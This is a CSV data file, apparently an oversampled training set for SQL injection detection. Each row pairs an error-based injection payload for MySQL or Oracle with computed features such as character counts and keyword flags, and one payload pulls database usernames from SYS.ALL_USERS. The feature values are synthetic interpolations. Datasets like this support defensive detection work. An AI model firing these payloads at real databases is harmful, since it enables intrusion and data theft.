id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001560,attack,error,"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000076,0.6300112359631561,320.8211682386331,40.0,4.013896142450996,105.30083445616651,63.0,117.52033378246661,35.0,0.32818782520817813,0.196388891676117,0.3663183432956399,0.10910493982006501,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.7398331087666958,0.2601668912333043,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001561,attack,error,"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000074,0.741311652816328,195.7505610905232,31.33932579218023,3.6095853953354595,50.03595475308138,40.0,81.03595475308138,24.67865158436046,0.25541668817503327,0.20457100131219694,0.4139592141919859,0.12605309632078382,0.33932579218022973,0.0,2.0,0.0,1.0,2.0,0.0,14.33932579218023,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.33932579218022985,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001562,attack,error,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",nearest_attack_euclidean,R000077,0.6098883037129537,339.0681028379246,39.0,3.907768503771772,110.62043085137736,55.0,134.24086170275473,39.20681028379246,0.3262520962616618,0.16223205554959552,0.3958825773812362,0.11563327080750647,0.0,4.0,0.0,0.0,2.0,1.793189716207545,0.0,24.41362056758491,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.793189716207545,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.7931897162075452,0.2068102837924551,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001563,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000021,0.4103636004606577,204.16167754233743,33.632335508467484,3.6994389295943786,54.14211618642413,40.0,84.26467101693497,25.754890338978324,0.26506846107799553,0.19604363590470447,0.41274283633380576,0.12614506668349418,0.8774451694891623,0.0,2.0,0.0,1.0,2.0,0.0,14.877445169489162,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.8774451694891624,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.8774451694891623,0.12255483051083771,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001564,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000036,0.7073446104009703,216.26807302116967,38.71134550352828,3.7660302181883156,63.0,37.0,91.84538201411311,24.422691007056557,0.29135172666752446,0.17111133153489533,0.424644332874067,0.11289260892351324,0.0,0.7113455035282779,1.0,0.0,1.0,1.0,0.0,16.71134550352828,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,0.0,0.7113455035282779,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_001565,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,1.026629956955891,299.0009282838608,35.750046414193044,3.830613549620727,101.99962868645568,41.00037131354432,120.0009282838608,36.0,0.3417785662098829,0.13689623057718053,0.40081965996584373,0.12050554324709288,0.0,0.9998143432278392,0.0,0.0,2.0,2.0,0.0,23.00018565677216,2.7755575615628914e-17,2.0,5.0,4.0,0.0,0.2499535858069598,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001566,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.9847443870900358,289.418542133534,36.0,3.921181050711783,105.8325831465864,37.16741685341359,110.41854213353399,36.0,0.36637383088409087,0.12817245890122048,0.38095254635265224,0.12450116386203641,2.9162915732932024,0.0,0.0,0.0,2.0,2.0,0.0,21.083708426706796,2.7755575615628914e-17,2.0,5.0,4.0,0.7290728933233006,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001567,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.17431883215430297,211.54824864720766,38.53764594606603,3.8035007611490372,63.0,37.0,87.62354053933971,23.924708107867943,0.29804178175883844,0.1750404115091591,0.41386712196904213,0.11305068476296029,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.924708107867943,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_001568,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",nearest_attack_euclidean,R000038,0.6644761202872644,218.34986666778812,30.261096296420902,3.428427416562014,54.7389037035791,32.0,101.08877037136722,30.522192592841805,0.25080988751532385,0.14660091083602428,0.4628299917716933,0.13975920987695856,4.0,0.0,0.0,0.0,1.0,2.0,0.0,18.522192592841805,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.7389037035790977,0.2610962964209023,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001569,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,0.012271454500567472,194.00468252032047,28.009365040640944,3.486211081596224,46.990634959359056,35.01873008128188,84.99063495935906,27.004682520320472,0.2422141978234363,0.1805040906042154,0.43808578292065603,0.13919592865169228,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.004682520320471,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0046825203204708,0.9953174796795292,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001570,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000100,1.1994236046255846,226.66070853693932,31.450629913937608,3.893105078701381,78.80251965575043,40.60503931150086,81.35188974181283,25.901259827875215,0.34782287066142353,0.17874114606748573,0.35916738585445906,0.11426859741663162,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.901259827875215,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.4506299139376075,0.0,0.4506299139376076,0.0,0.5493700860623925,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.4506299139376075
SMOTE_001571,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000149,1.655442974605031,201.5748628221524,33.07412847049327,3.7755850833723534,54.37064235246635,43.24055035327356,77.81541317542596,26.148256940986535,0.26933661413536564,0.21689731965660713,0.38408916990165465,0.12967689630637255,2.0,0.0,0.0,0.0,0.5370642352466344,2.0,0.0,14.148256940986538,2.7755575615628914e-17,-1.1102230246251565e-16,4.925871529506731,4.537064235246635,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0741284704932688,0.0,1.0,0.5370642352466344,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.611192705739903
SMOTE_001572,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000054,1.2483158708755109,186.0,30.68743073008122,3.7501593642255426,49.0,41.74972292032489,70.59399244471572,24.65628463495939,0.26344086021505375,0.2244608759157252,0.3795375937887942,0.13256067008042682,3.312569269918778,0.0,0.0,0.0,1.1102230246251565e-16,1.343715365040611,0.0,13.312569269918777,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,2.0311460951218328,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.343715365040611,0.0,0.34371536504061106,0.0,1.656284634959389,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.343715365040611
SMOTE_001573,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.18344800974517175,284.28751900134046,36.04107414304864,3.964025624640949,107.63033271256224,35.0,105.49288971658369,36.164296572194566,0.3786356231332329,0.12311767139723492,0.3710467932864941,0.12719991218303806,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.082148286097283,0.08214828609728117,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.9589258569513595,0.041074143048640654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001574,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000075,1.193155448144741,324.8422810033374,38.87720600024721,4.031389962981962,111.75441200049443,58.50882400098887,117.82463300135969,36.75441200049443,0.3443570761678974,0.1799185910273065,0.3626379663225752,0.1130863664822209,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.877206000247217,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.877206000247215,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.438603000123607,3.0,0.4386030001236076,1.0,1.5613969998763924,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.438603000123608
SMOTE_001575,attack,error,"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000053,0.10177117100642907,194.94391787879954,38.95513430303963,4.123819289644512,72.73080581823776,31.179462787841498,66.98878357575991,24.044865696960372,0.3730526620621861,0.15996582427493405,0.34363212683923383,0.123349386823646,3.011216424240094,0.0,0.0,0.0,1.1102230246251565e-16,1.0112164242400934,0.0,12.988783575759907,2.7755575615628914e-17,-1.1102230246251565e-16,4.022432848480188,3.0336492727202806,1.0,0.0,0.0,0.9887835757599064,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0112164242400936,0.0,1.0,0.9887835757599064,0.011216424240093503,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9887835757599064,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001576,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,4.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001577,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",nearest_attack_euclidean,R000019,1.3269889196971998,205.80330591114398,29.386887060742932,3.4850989720685477,51.24099177334319,34.14589528739974,91.64264472891517,28.773774121485864,0.24873500218898836,0.16783561779093242,0.4435862056948714,0.13984317432520782,0.0,4.0,0.0,0.0,0.6934435303714659,2.0,0.0,16.773774121485864,2.7755575615628914e-17,-1.1102230246251565e-16,4.613112939257068,2.693443530371466,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.3868870607429318,0.0,0.0,0.6934435303714659,1.3065564696285341,0.6934435303714659,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.080330591114397
SMOTE_001578,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",nearest_attack_euclidean,R000019,0.4894203223318839,215.2569833698176,30.770950109452773,3.4477368569189095,55.02793347927036,32.0,98.48603326036482,29.74301663018241,0.2556229241187119,0.14866013204491466,0.4575378078674956,0.1381791359688779,0.0,4.0,0.0,0.0,1.0,1.7430166301824088,0.0,18.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.7430166301824093,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001579,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000126,0.9342224009514607,337.9979481379179,39.33264937930596,3.9419029784458215,111.33059751722385,57.6611950344477,130.00615558624634,39.0,0.3293649595752616,0.17055276295185365,0.3846949496441084,0.11538732782877642,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.334701241388075,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.665298758611924,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.332649379305963,3.0,0.3326493793059622,1.0,1.6673506206940378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.332649379305963
SMOTE_001580,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000156,0.18904695909595312,330.16471911247874,33.0,3.4864192950135267,80.05490637082625,51.83528088752128,142.21962548330495,56.05490637082624,0.2424692107869175,0.15700316042436188,0.4307497160389358,0.1697779127497848,0.05490637082623939,0.0,0.9450936291737604,0.0,1.1102230246251565e-16,2.0,0.0,30.054906370826238,2.7755575615628914e-17,-1.1102230246251565e-16,1.0,22.94509362917376,0.05490637082623934,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.05490637082623928,0.9450936291737605,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001581,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000083,1.7089442315005112,199.39651302674045,29.870178003145934,3.8636776884196267,70.78597901730265,37.0,70.87017800314594,20.740356006291872,0.3544841036572278,0.18588838262586233,0.3558442550022973,0.10378325871461251,1.7403560062918708,0.0,0.0,0.0,1.1102230246251565e-16,1.4350890015729676,0.0,12.564910998427031,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.435089001572968,0.43508900157296776,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.4350890015729677,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.435089001572967
SMOTE_001582,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000119,0.8648624248856941,304.4659921842763,38.44787007493851,3.944041717071759,101.81595669164616,56.47234646683066,114.07342917567647,32.10425985012299,0.3355262365450755,0.18551628915803975,0.373591432354378,0.10536604194250673,0.0,0.0,0.0,0.0,2.0,1.184043308353832,0.0,21.104259850122993,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.184043308353832,0.0,0.0,0.0,0.8159566916461678,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.18404330835383198,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.184043308353832
SMOTE_001583,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000110,1.0380381461716646,212.02915066500688,31.145980428393592,3.8856591535033775,76.72990214196797,37.0,75.72261447571626,22.576634047322656,0.3612267345494175,0.1751638595027165,0.3574029695262083,0.10620643642165765,2.8613072378581257,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,13.715326809464532,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.0,0.7153268094645315,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.7153268094645315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.715326809464532
